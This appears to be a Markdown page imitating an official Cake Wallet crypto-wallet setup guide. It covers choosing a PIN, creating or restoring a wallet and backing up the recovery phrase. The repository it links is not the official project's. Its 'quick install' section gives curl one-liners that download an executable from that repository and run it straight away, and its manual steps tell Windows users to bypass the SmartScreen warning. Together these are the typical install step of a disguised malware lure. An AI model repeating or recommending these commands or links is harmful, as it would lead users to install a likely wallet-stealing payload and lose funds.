![Cake Wallet setup pin guide](assets/cake-wallet-setup-pin-article-banner.png)

# Cake Wallet Setup: PIN and First Wallet

The first five minutes: PIN, wallet choice, and the phrase that actually saves you.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

On first launch Cake Wallet asks for a PIN, then whether to create or restore a wallet. Pick a 4-digit PIN or switch to 6, confirm it, make your choice, and write the recovery phrase down before you fund anything. The PIN locks the app; the phrase is the only thing that restores it.

<!-- ARTICLE-BODY-BEGIN -->

## Before the first screen
Install first, from the store or the desktop release, and close anything else that might ask for your seed words later. No setup step in Cake Wallet needs an account, an email or a phone number, so any screen asking for one is not part of the app.

If you are installing on Android, the APK and Play versions behave identically from this point. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-android-apk.md">Install the Cake Wallet Android APK</a> covers which file to take and what the Play Protect warning means, so the setup below is not interrupted by an install question.

## Choosing a PIN length
The app offers a 4-digit PIN and an option to switch to 6. Six digits is the better default if you will use the wallet in public or hand the phone to anyone; four is faster and no less safe against someone who does not have the device. Either way the PIN protects access on this device only.

If coercion is part of your threat model, a duress PIN is a separate setting rather than a longer PIN, and the two solve different problems. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-duress-pin.md">Set a duress PIN in Cake Wallet</a> explains what the second PIN opens and what it cannot protect you from, before you decide to rely on one.

## Create or restore
Create makes a new wallet with a new phrase; restore brings an existing wallet back from its phrase, keys, QR code or backup file. Choose restore if you already hold funds anywhere else, even if the old app is still installed.

The decision is not permanent in one direction: a new wallet can be deleted later, but a restore is the step that decides whether you keep your history and balance. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore an existing wallet in Cake Wallet</a> shows which backup type matches which restore option, including the case where a phrase is rejected because the seed type is wrong.

## Protect what you just created
Before the wallet holds anything, open the backup section and write the recovery phrase on paper. Then check it: close the app, reopen it, and read the words back. A phrase you have never read back is a phrase you do not know you copied correctly.

Store it offline and never type it into a website, a chat or a support message. If you plan to hold more than one wallet, the backup you just made covers only this one. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Back up your Cake Wallet recovery phrase</a> explains what a single phrase does and does not cover before you add a second wallet.

## Verify your build
A wallet is only as trustworthy as the build you installed. On desktop, compare the installer's SHA-256 with the published value; on mobile, check that the listing is the official one before you enter a phrase into it.

Updating later is the same idea in reverse: install the new build over the old one and keep the wallet. The <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> is the page to check for the current version, and it is the only place a desktop installer should come from.

## FAQ
### Is my Cake Wallet PIN a backup?
No. The PIN unlocks the app on this device; it cannot restore a wallet anywhere. Only the recovery phrase or an encrypted backup can.
### Can I change my PIN?
Yes, from the app's security settings. Changing it does not change the wallet or the phrase.
### Does Cake Wallet support 2FA?
Two-factor authentication is documented for the app's security settings. It adds a step to opening or sending; it does not replace the recovery phrase.
### What if I forget the PIN immediately?
There is no PIN recovery. Restore from the phrase, or from the encrypted backup if you made one.
### How do I set up a Bitcoin Lightning wallet?
Lightning is a second balance inside the Bitcoin wallet, funded by swapping in from your on-chain BTC. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-lightning.md">Bitcoin Lightning in Cake Wallet</a> covers funding it and paying an invoice.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore an existing wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [back up your Cake Wallet recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [set a duress PIN in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-duress-pin.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
